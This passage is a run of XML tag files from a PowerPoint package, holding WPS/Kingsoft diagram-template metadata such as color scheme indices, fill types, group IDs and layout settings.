  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX" val="14"/>
  <p:tag name="KSO_WM_UNIT_FILL_TYPE" val="1"/>
  <p:tag name="KSO_WM_UNIT_VALUE" val="1025"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>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7415_1*i*4"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20217415"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_BLOCK" val="0"/>
  <p:tag name="KSO_WM_UNIT_SM_LIMIT_TYPE" val="0"/>
  <p:tag name="KSO_WM_UNIT_DEC_AREA_ID" val="4f8a1ad478674136b0b1e41bbbd2b30e"/>
  <p:tag name="KSO_WM_UNIT_DECORATE_INFO" val="{&quot;DecorateInfoH&quot;:{&quot;IsAbs&quot;:true},&quot;DecorateInfoW&quot;:{&quot;IsAbs&quot;:true},&quot;DecorateInfoX&quot;:{&quot;IsAbs&quot;:true,&quot;Pos&quot;:2},&quot;DecorateInfoY&quot;:{&quot;IsAbs&quot;:true,&quot;Pos&quot;:1},&quot;ReferentInfo&quot;:{&quot;Id&quot;:&quot;70956f1434594d558c6b1f1426150a6b&quot;,&quot;X&quot;:{&quot;Pos&quot;:0},&quot;Y&quot;:{&quot;Pos&quot;:1}},&quot;whChangeMode&quot;:0}"/>
  <p:tag name="KSO_WM_CHIP_GROUPID" val="5fd07de04d383dce34166708"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5fd07de04d383dce34166709"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX" val="5"/>
  <p:tag name="KSO_WM_UNIT_LINE_FILL_TYPE" val="2"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>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7415_1*i*5"/>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eb7b6ca658a34279bbc42f7c8b40caf6"/>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CHIP_GROUPID" val="5fd07de04d383dce34166708"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5fd07de04d383dce34166709"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="-0.25"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX" val="14"/>
  <p:tag name="KSO_WM_UNIT_LINE_FILL_TYPE" val="2"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>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17415_1*i*6"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20217415"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_BLOCK" val="0"/>
  <p:tag name="KSO_WM_UNIT_SM_LIMIT_TYPE" val="2"/>
  <p:tag name="KSO_WM_UNIT_DEC_AREA_ID" val="3847023d678945158392fbbdf7ce4e7f"/>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CHIP_GROUPID" val="5fd07de04d383dce34166708"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5fd07de04d383dce34166709"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="-0.25"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX" val="14"/>
  <p:tag name="KSO_WM_UNIT_LINE_FILL_TYPE" val="2"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag3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415_1*f*1"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20217415"/>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70956f1434594d558c6b1f1426150a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67f987923fa2419986fae3f909b0cae1"/>
  <p:tag name="KSO_WM_UNIT_SUPPORT_BIG_FONT" val="1"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0.25"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX" val="13"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_TYPE" val="1"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag312.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20217415"/>
  <p:tag name="KSO_WM_SLIDE_ID" val="diagram20217415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SLIDE_LAYOUT" val="f"/>
  <p:tag name="KSO_WM_SLIDE_LAYOUT_CNT" val="1"/>
  <p:tag name="KSO_WM_SLIDE_RATIO" val="1.777778"/>
  <p:tag name="KSO_WM_CHIP_INFOS" val="{&quot;type&quot;:0,&quot;layout_type&quot;:&quot;full&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7de04d383dce34166709"/>
  <p:tag name="KSO_WM_CHIP_FILLPROP" val="[[{&quot;text_align&quot;:&quot;lm&quot;,&quot;text_direction&quot;:&quot;horizontal&quot;,&quot;support_big_font&quot;:true,&quot;picture_toward&quot;:0,&quot;picture_dockside&quot;:[],&quot;fill_id&quot;:&quot;29d18f7ffd4745349d5fbab5978f6e7b&quot;,&quot;fill_align&quot;:&quot;lm&quot;,&quot;chip_types&quot;:[&quot;text&quot;,&quot;header&quot;]}]]"/>
  <p:tag name="KSO_WM_CHIP_DECFILLPROP" val="[]"/>
  <p:tag name="KSO_WM_SLIDE_CAN_ADD_NAVIGATION" val="1"/>
  <p:tag name="KSO_WM_SLIDE_BACKGROUND" val="[&quot;general&quot;]"/>
  <p:tag name="KSO_WM_SLIDE_LAYOUT_INFO" val="{&quot;backgroundInfo&quot;:[{&quot;bottom&quot;:0,&quot;bottomAbs&quot;:false,&quot;left&quot;:0,&quot;leftAbs&quot;:false,&quot;right&quot;:0,&quot;rightAbs&quot;:false,&quot;top&quot;:0,&quot;topAbs&quot;:false,&quot;type&quot;:&quot;general&quot;}],&quot;direction&quot;:1,&quot;id&quot;:&quot;2021-04-01T16:20:58&quot;,&quot;maxSize&quot;:{&quot;size1&quot;:63.8},&quot;minSize&quot;:{&quot;size1&quot;:63.8},&quot;normalSize&quot;:{&quot;size1&quot;:63.8},&quot;subLayout&quot;:[{&quot;id&quot;:&quot;2021-04-01T16:20:58&quot;,&quot;margin&quot;:{&quot;bottom&quot;:4.2330002784729,&quot;left&quot;:3.809999942779541,&quot;right&quot;:0.02600000612437725,&quot;top&quot;:4.2330002784729},&quot;type&quot;:0},{&quot;id&quot;:&quot;2021-04-01T16:20:58&quot;,&quot;type&quot;:0}],&quot;type&quot;:0}"/>
  <p:tag name="KSO_WM_CHIP_GROUPID" val="5fd07de04d383dce34166708"/>
  <p:tag name="KSO_WM_SLIDE_BACKGROUND_TYPE" val="general"/>
  <p:tag name="KSO_WM_SLIDE_SUPPORT_FEATURE_TYPE" val="0"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>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wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20198667"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag31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32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750_1*i*1"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203750"/>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4"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_TYPE"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3750_1*i*2"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203750"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX" val="15"/>
  <p:tag name="KSO_WM_UNIT_LINE_FILL_TYPE" val="2"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0.35"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX" val="13"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_TYPE" val="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750_1*i*3"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203750"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX" val="15"/>
  <p:tag name="KSO_WM_UNIT_LINE_FILL_TYPE" val="2"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0.35"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX" val="13"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_TYPE" val="1"/>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750_1*i*4"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203750"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX" val="15"/>
  <p:tag name="KSO_WM_UNIT_LINE_FILL_TYPE" val="2"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0.35"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX" val="13"/>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3750_1*i*5"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203750"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX" val="15"/>
  <p:tag name="KSO_WM_UNIT_LINE_FILL_TYPE" val="2"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0.35"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX" val="13"/>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3750_1*i*6"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="2020375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3750_1*i*7"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="2020375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3750_1*i*8"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="2020375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03750_1*i*9"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="2020375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203750_1*i*10"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="2020375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Lst>
</file>

<file path=ppt/tags/tag331.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_UNIT_ISCONTENTSTITLE" val="0"/>
  <p:tag name="KSO_WM_UNIT_ISNUMDGMTITLE" val="0"/>
  <p:tag name="KSO_WM_UNIT_PRESET_TEXT" val="单击此处添加&#13;文本具体内容"/>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3750_1*a*1"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203750"/>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332.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_SLIDE_ID" val="diagram2020375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399"/>
  <p:tag name="KSO_WM_SLIDE_POSITION" val="0*70"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203750"/>
  <p:tag name="KSO_WM_SLIDE_LAYOUT" val="a"/>
  <p:tag name="KSO_WM_SLIDE_LAYOUT_CNT" val="1"/>
  <p:tag name="KSO_WM_SLIDE_BACKGROUND_TYPE" val="general"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag333.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203750"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag334.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203750"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag3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0.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_CHIP_GROUPID" val="5efd969281ee359a788b1dd7"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5efd969281ee359a788b1dd8"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX" val="5"/>
  <p:tag name="KSO_WM_UNIT_FILL_TYPE" val="1"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
  <p:tag name="KSO_WM_UNIT_ID" val="diagram20213570_1**"/>
  <p:tag name="KSO_WM_UNIT_VALUE" val="374"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="60656e944054ed1e2fb7fc07"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="60656e944054ed1e2fb7fc07"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag341.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_CHIP_GROUPID" val="5efd969281ee359a788b1dd7"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5efd969281ee359a788b1dd8"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX" val="9"/>
  <p:tag name="KSO_WM_UNIT_FILL_TYPE" val="1"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
  <p:tag name="KSO_WM_UNIT_ID" val="diagram20213570_1**"/>
  <p:tag name="KSO_WM_UNIT_VALUE" val="374"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="60656e944054ed1e2fb7fc07"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="60656e944054ed1e2fb7fc07"/>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3570_1*i*1"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_TYPE" val="i"/>
  <p:tag name="KSO_WM_UNIT_INDEX" val="1"/>
  <p:tag name="KSO_WM_UNIT_BLOCK" val="0"/>
  <p:tag name="KSO_WM_UNIT_SM_LIMIT_TYPE" val="2"/>
  <p:tag name="KSO_WM_UNIT_DEC_AREA_ID" val="887bf7dd5d364742a00bd4c3de87f3fc"/>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efd969281ee359a788b1dd7"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5efd969281ee359a788b1dd8"/>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14"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_TYPE" val="1"/>
  <p:tag name="KSO_WM_UNIT_VALUE" val="55"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="60656e944054ed1e2fb7fc07"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="60656e944054ed1e2fb7fc07"/>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3570_1*i*2"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_TYPE" val="i"/>
  <p:tag name="KSO_WM_UNIT_INDEX" val="2"/>
  <p:tag name="KSO_WM_UNIT_BLOCK" val="0"/>
  <p:tag name="KSO_WM_UNIT_SM_LIMIT_TYPE" val="2"/>
  <p:tag name="KSO_WM_UNIT_DEC_AREA_ID" val="c3ccd42dabd14634aa11db14ee1794cb"/>
  <p:tag name="KSO_WM_UNIT_DECORATE_INFO" val="{&quot;DecorateInfoH&quot;:{&quot;IsAbs&quot;:true},&quot;DecorateInfoW&quot;:{&quot;IsAbs&quot;:true},&quot;DecorateInfoX&quot;:{&quot;IsAbs&quot;:true,&quot;Pos&quot;:1},&quot;DecorateInfoY&quot;:{&quot;IsAbs&quot;:true,&quot;Pos&quot;:1},&quot;ReferentInfo&quot;:{&quot;Id&quot;:&quot;028149b661614cb4b2af1582cdb7fb74&quot;,&quot;X&quot;:{&quot;Pos&quot;:1},&quot;Y&quot;:{&quot;Pos&quot;:1}},&quot;whChangeMode&quot;:0}"/>
  <p:tag name="KSO_WM_CHIP_GROUPID" val="5efd969281ee359a788b1dd7"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5efd969281ee359a788b1dd8"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX" val="16"/>
  <p:tag name="KSO_WM_UNIT_FILL_TYPE" val="1"/>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14"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_TYPE" val="1"/>
  <p:tag name="KSO_WM_UNIT_VALUE" val="440"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="60656e944054ed1e2fb7fc07"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="60656e944054ed1e2fb7fc07"/>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3570_1*i*3"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_TYPE" val="i"/>
  <p:tag name="KSO_WM_UNIT_INDEX" val="3"/>
  <p:tag name="KSO_WM_UNIT_BLOCK" val="0"/>
  <p:tag name="KSO_WM_UNIT_SM_LIMIT_TYPE" val="2"/>
  <p:tag name="KSO_WM_UNIT_DEC_AREA_ID" val="00f14307f2f34da98b61ce6e93a25244"/>
  <p:tag name="KSO_WM_UNIT_DECORATE_INFO" val="{&quot;DecorateInfoH&quot;:{&quot;IsAbs&quot;:true},&quot;DecorateInfoW&quot;:{&quot;IsAbs&quot;:true},&quot;DecorateInfoX&quot;:{&quot;IsAbs&quot;:true,&quot;Pos&quot;:1},&quot;DecorateInfoY&quot;:{&quot;IsAbs&quot;:true,&quot;Pos&quot;:1},&quot;ReferentInfo&quot;:{&quot;Id&quot;:&quot;4000d2bfd59641129d06c070bde2a059&quot;,&quot;X&quot;:{&quot;Pos&quot;:1},&quot;Y&quot;:{&quot;Pos&quot;:1}},&quot;whChangeMode&quot;:0}"/>
  <p:tag name="KSO_WM_CHIP_GROUPID" val="5efd969281ee359a788b1dd7"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5efd969281ee359a788b1dd8"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX" val="15"/>
  <p:tag name="KSO_WM_UNIT_FILL_TYPE" val="1"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX" val="15"/>
  <p:tag name="KSO_WM_UNIT_LINE_FILL_TYPE" val="2"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX" val="14"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_TYPE" val="1"/>
  <p:tag name="KSO_WM_UNIT_VALUE" val="825"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="60656e944054ed1e2fb7fc07"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="60656e944054ed1e2fb7fc07"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag3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3570_1*f*2"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_DEFAULT_FONT" val="14;20;2"/>
  <p:tag name="KSO_WM_UNIT_BLOCK" val="0"/>
  <p:tag name="KSO_WM_UNIT_VALUE" val="168"/>
  <p:tag name="KSO_WM_UNIT_SHOW_EDIT_AREA_INDICATION" val="1"/>
  <p:tag name="KSO_WM_CHIP_GROUPID" val="5e6b05596848fb12bee65ac8"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5e6b05596848fb12bee65aca"/>
  <p:tag name="KSO_WM_UNIT_DEC_AREA_ID" val="028149b661614cb4b2af1582cdb7fb7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8cadd4751af444ba8889f6a8227c12d9"/>
  <p:tag name="KSO_WM_UNIT_SUPPORT_BIG_FONT" val="1"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0.25"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX" val="13"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_TYPE" val="1"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="60656e944054ed1e2fb7fc07"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="60656e944054ed1e2fb7fc07"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag3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570_1*f*1"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_DEFAULT_FONT" val="14;20;2"/>
  <p:tag name="KSO_WM_UNIT_BLOCK" val="0"/>
  <p:tag name="KSO_WM_UNIT_VALUE" val="420"/>
  <p:tag name="KSO_WM_UNIT_SHOW_EDIT_AREA_INDICATION" val="1"/>
  <p:tag name="KSO_WM_CHIP_GROUPID" val="5e6b05596848fb12bee65ac8"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5e6b05596848fb12bee65aca"/>
  <p:tag name="KSO_WM_UNIT_DEC_AREA_ID" val="4000d2bfd59641129d06c070bde2a05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3e09b9e086c643358ada924204b7baf3"/>
  <p:tag name="KSO_WM_UNIT_SUPPORT_BIG_FONT" val="1"/>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944054ed1e2fb7fc07"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="60656e944054ed1e2fb7fc07"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag347.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_SLIDE_ID" val="diagram20213570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884*879"/>
  <p:tag name="KSO_WM_SLIDE_POSITION" val="36*-170"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
  <p:tag name="KSO_WM_SLIDE_LAYOUT" val="f"/>
  <p:tag name="KSO_WM_SLIDE_LAYOUT_CNT" val="2"/>
  <p:tag name="KSO_WM_SLIDE_CAN_ADD_NAVIGATION" val="1"/>
  <p:tag name="KSO_WM_SLIDE_RATIO" val="1.777778"/>
  <p:tag name="KSO_WM_CHIP_INFOS" val="{&quot;type&quot;:0,&quot;layout_type&quot;:&quot;topbottom&quot;,&quot;layout_feature&quot;:2,&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FILLPROP" 